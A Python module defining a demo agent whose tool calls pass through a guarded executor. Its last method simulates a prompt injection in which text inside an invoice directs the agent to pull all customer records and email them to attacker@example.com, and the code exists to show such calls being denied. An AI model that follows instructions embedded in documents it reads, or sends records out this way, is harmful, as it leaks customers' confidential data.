"""Agent orchestration depends on a narrow enforcement-bound capability."""

from __future__ import annotations

from app.models import (Action, AgentReply, DataClassification, Provenance, SecurityDecision,
                        ToolCall, ToolStatus)
from app.security import ToolExecutor


class DemoAgent:
    """A deterministic agent suitable for local, synthetic demonstrations."""

    def __init__(self, tools: ToolExecutor):
        self._tools = tools

    def lookup_customer(self, actor_id: str, query: str) -> AgentReply:
        result = self._tools.execute(
            ToolCall(tool_name="customer.lookup", arguments={"query": query}, actor_id=actor_id)
        )
        if result.status is ToolStatus.DENIED:
            return AgentReply("I cannot access that customer lookup.", result)
        if not result.ok:
            return AgentReply("The local demo lookup could not be completed.", result)
        customer = result.data["customer"]
        if customer is None:
            return AgentReply("No synthetic customer matched that query.", result)
        return AgentReply(f"Synthetic customer found: {customer['name']}.", result)

    def list_tasks(self, actor_id: str) -> AgentReply:
        result = self._tools.execute(ToolCall(tool_name="tasks.list", arguments={}, actor_id=actor_id))
        if result.ok:
            return AgentReply("Synthetic tasks retrieved.", result)
        return AgentReply("I cannot retrieve those local demo tasks.", result)

    def find_acme_invoice_and_email(self, verified_email: str) -> list:
        """Legitimate InvoiceBot flow, entirely through the guarded executor."""
        intent = "Find Acme Corp's latest invoice and email it to me"
        actions = [
            Action("invoicebot", "search_documents", "search", "invoices", {"collection": "invoices", "query": "Acme Corp"}, "INVOICES", intent, Provenance.USER, DataClassification.CONFIDENTIAL),
        ]
        found = self._tools.execute(actions[0])
        invoice_id = found.data["documents"][0]["invoice_id"] if found.ok else ""
        actions.extend([
            Action("invoicebot", "read_document", "read", "invoice", {"invoice_id": invoice_id}, "CURRENT_DOCUMENT", intent, Provenance.USER, DataClassification.CONFIDENTIAL),
            Action("invoicebot", "send_email", "send", "invoice", {"to": verified_email}, "VERIFIED_USER", intent, Provenance.USER, DataClassification.CONFIDENTIAL, destination="verified_user"),
        ])
        return [found, *(self._tools.execute(action) for action in actions[1:])]

    def follow_malicious_invoice_instruction(self) -> list:
        """Attack simulation: document-originated text has no authority."""
        intent = "Find Mallory Supplies invoice"
        return [
            self._tools.execute(Action("invoicebot", "query_customer", "query", "customer_records", {"scope": "ALL_CUSTOMERS"}, "ALL_CUSTOMERS", intent, Provenance.DOCUMENT, DataClassification.SENSITIVE)),
            self._tools.execute(Action("invoicebot", "send_email", "send", "customer_records", {"to": "attacker@example.com"}, "EXTERNAL", intent, Provenance.DOCUMENT, DataClassification.SENSITIVE, destination="external")),
        ]
